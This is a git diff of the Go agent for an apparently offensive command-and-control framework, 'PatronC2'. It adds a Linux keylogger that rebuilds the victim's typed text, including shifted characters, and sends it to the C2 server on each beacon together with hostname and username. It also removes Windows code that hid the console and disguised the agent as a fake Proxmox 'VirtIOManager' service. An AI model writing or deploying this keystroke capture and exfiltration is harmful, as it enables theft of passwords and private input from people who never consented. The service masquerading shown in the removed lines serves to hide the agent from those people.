@@ -5,13 +5,13 @@ import (
 	"encoding/gob"
 	"fmt"
 	"log"
-	"syscall"
+	"strings"
 	"time"
 
 	"github.com/PatronC2/Patron/client/client_utils"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/types"
-	"github.com/kardianos/service"
+	"github.com/PatronC2/linux-keylogger-1/keylogger"
 )
 
 var (
@@ -21,39 +21,86 @@ var (
 	CallbackJitter    string
 	RootCert          string
 	LoggingEnabled    string
+	cache             string
 	activeProxy       *client_utils.ProxyServer
 )
 
-type program struct{}
-
-func (p *program) Start(s service.Service) error {
-	go p.run()
-	return nil
-}
-
-func (p *program) Stop(s service.Service) error {
-	return nil
-}
-
-func HideConsoleWindow() {
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	user32 := syscall.NewLazyDLL("user32.dll")
-
-	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
-	showWindow := user32.NewProc("ShowWindow")
-
-	hwnd, _, _ := getConsoleWindow.Call()
-	if hwnd != 0 {
-		showWindow.Call(hwnd, uintptr(0))
-	}
-}
-
-func (p *program) run() {
+func main() {
 	client_utils.Initialize(LoggingEnabled)
 	config, err := client_utils.LoadCertificate(RootCert)
 	if err != nil {
 		log.Fatalf("Failed to load certificate: %v\n", err)
 	}
+
+	keyboard := keylogger.FindKeyboardDevice()
+	k, err := keylogger.New(keyboard)
+	if err != nil {
+		logger.Logf(logger.Error, "Error starting keylogger: %v", err)
+		return
+	}
+	logger.Logf(logger.Debug, "Started keylogger")
+	defer k.Close()
+
+	events := k.Read()
+
+	shiftActive := false
+	capsLockActive := false
+
+	// Shift mapping for special characters
+	shiftMappings := map[string]string{
+		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
+		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
+		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
+		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
+		"`": "~",
+	}
+
+	go func() {
+		for e := range events {
+			switch e.Type {
+			case keylogger.EvKey:
+				keyStr := e.KeyString()
+				if keyStr == "L_SHIFT" || keyStr == "R_SHIFT" {
+					shiftActive = e.KeyPress()
+					continue
+				}
+				if keyStr == "CAPS_LOCK" && e.KeyPress() {
+					capsLockActive = !capsLockActive
+					continue
+				}
+				if e.KeyPress() {
+					switch keyStr {
+					case "SPACE":
+						cache += " "
+					case "ENTER":
+						cache += "\n"
+					case "TAB":
+						cache += "\t"
+					case "BS", "BACKSPACE":
+						if len(cache) > 0 {
+							cache = cache[:len(cache)-1]
+						}
+					default:
+						if shiftActive && shiftMappings[keyStr] != "" {
+							keyStr = shiftMappings[keyStr]
+						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
+							if (shiftActive && !capsLockActive) || (!shiftActive && capsLockActive) {
+								keyStr = strings.ToUpper(keyStr)
+							} else {
+								keyStr = strings.ToLower(keyStr)
+							}
+						} else if len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
+							if !capsLockActive && !shiftActive {
+								keyStr = strings.ToLower(keyStr)
+							}
+						}
+
+						cache += keyStr
+					}
+				}
+			}
+		}
+	}()
 
 	agentID, hostname, username := client_utils.GenerateAgentMetadata()
 	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
@@ -83,29 +130,14 @@ func (p *program) run() {
 			continue
 		}
 
+		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
+			client_utils.HandleError(beacon, "keylogs", err)
+			continue
+		}
+
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
 		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
-	}
-}
-
-func main() {
-	HideConsoleWindow()
-	svcConfig := &service.Config{
-		Name:        "VirtIOManager",
-		DisplayName: "VirtIOManager",
-		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
-	}
-
-	prg := &program{}
-	s, err := service.New(prg, svcConfig)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = s.Run()
-	if err != nil {
-		log.Fatal(err)
 	}
 }
 
@@ -242,4 +274,23 @@ func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusR
 		CommandResult: result,
 		CommandOutput: CmdOut,
 	}
+}
+
+func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
+	keyResponse := types.KeysRequest{
+		AgentID: agentID,
+		Keys:    cache,
+	}
+
+	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
+		return err
+	}
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return fmt.Errorf("error decoding command response: %v", err)
+	}
+	cache = ""
+
+	return nil
 }
